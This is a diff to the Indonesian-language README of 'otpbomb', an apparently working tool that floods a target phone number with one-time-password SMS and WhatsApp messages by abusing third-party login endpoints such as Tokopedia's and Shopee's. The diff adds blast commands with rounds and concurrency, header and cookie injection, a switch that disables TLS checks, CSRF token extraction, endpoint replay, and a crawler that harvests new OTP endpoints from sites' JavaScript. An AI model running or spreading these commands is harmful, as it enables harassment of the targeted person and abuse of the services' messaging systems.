@@ -4,18 +4,32 @@ Pengiriman OTP berulang ke satu nomor lewat matriks endpoint milik layanan
 pihak ketiga. Async, per-provider backoff, statistik per endpoint, siap
 dipanggil dari skrip lain lewat `--json`.
 
+Pakai launcher `./otpbomb` (jalan dari direktori mana pun), atau
+`PYTHONPATH=tools python3 -m otpbomb …` dari root repo.
+
 ```
-python3 -m otpbomb list                      # semua endpoint + tier
-python3 -m otpbomb probe                     # uji ulang hidup/mati
-python3 -m otpbomb blast 081234567890        # tier live (default)
-python3 -m otpbomb blast 0812... --rounds 5 --concurrency 32
-python3 -m otpbomb blast 0812... --category wa --per-provider 4 --wave 3
-python3 -m otpbomb blast 0812... --all --json out.json
-python3 -m otpbomb selftest                  # offline, tanpa jaringan
+./otpbomb list                      # semua endpoint + tier
+./otpbomb probe                     # uji ulang hidup/mati
+./otpbomb blast 081234567890        # tier live (default)
+./otpbomb blast 0812... --rounds 5 --concurrency 32
+./otpbomb blast 0812... --category wa --per-provider 4 --wave 3
+./otpbomb blast 0812... --all --json out.json
+./otpbomb blast 0812... -H 'x-device: abc' --cookie 'cf=xyz' -k
+./otpbomb rp --name tokopedia       # replay satu endpoint, cetak verdict
+./otpbomb discover shopee.co.id --out found.json
+./otpbomb selftest                  # offline, tanpa jaringan (69 cek)
 ```
 
 Total request = `--rounds x provider x --per-provider`. SIGINT mencetak
-ringkasan parsial, bukan membuang hasil.
+ringkasan parsial, bukan membuang hasil. Kode keluar: 0 ada yang sukses,
+2 nol sukses.
+
+## Header, cookie, TLS
+
+`-H 'K: V'` (bisa diulang) untuk header per-app seperti `x-device`,
+`cf_clearance`, atau `authorization`. `--cookie 'a=b; c=d'` untuk sesi.
+`-k` mematikan verifikasi TLS (host dengan sertifikat rusak). Semua header
+dikirim ke warm-up `pre_url` juga.
 
 ## Tier
 
@@ -52,21 +66,27 @@ kanal WA saja.
 ```
 
 ```
-python3 -m otpbomb blast 0812... --providers-file ./punyaku.json --tier all
+./otpbomb blast 0812... --providers-file ./punyaku.json --tier all
 ```
 
 Token yang bisa dipakai di url/form/headers: `{e164}` `+62…`, `{digits}`
 `62…`, `{local}` `08…`, `{uuid}`, `{ts}`, `{rand16}`.
 
 Field lengkap per provider: `name category url method form json_body headers
-pre_url extract success_codes success_contains fail_contains tier note`.
-`extract` mengambil token dari respons `pre_url` (`header:Nama`,
-`field:nama`, `cookie:nama`) — dipakai untuk endpoint ber-CSRF.
+pre_url extract success_codes success_contains fail_contains soft_contains tier
+note`. `extract` mengambil token dari respons `pre_url` (`header:Nama`,
+`field:nama`, `cookie:nama`) — dipakai untuk endpoint ber-CSRF; token
+`header:` bisa ikut ke warm-up. `soft_contains` = penanda yang tetap
+dihitung sukses pada status < 500 (mis. `10002` = nomor belum terdaftar).
+
+`./otpbomb rp --name X` (atau `./otpbomb rp spec.json`) memutar ulang satu
+entri persis seperti engine — termasuk warm-up dan token — lalu mencetak
+status, body, dan verdict. Ini alat bukti, bukan pengganti blast.
 
 ## Menemukan endpoint baru
 
 ```
-python3 -m otpbomb.discover shopee.co.id tokopedia.com --out found.json
+./otpbomb discover shopee.co.id tokopedia.com --out found.json
 ```
 
 Crawler membuka halaman login/daftar, mengambil bundle JS, dan menyaring URL
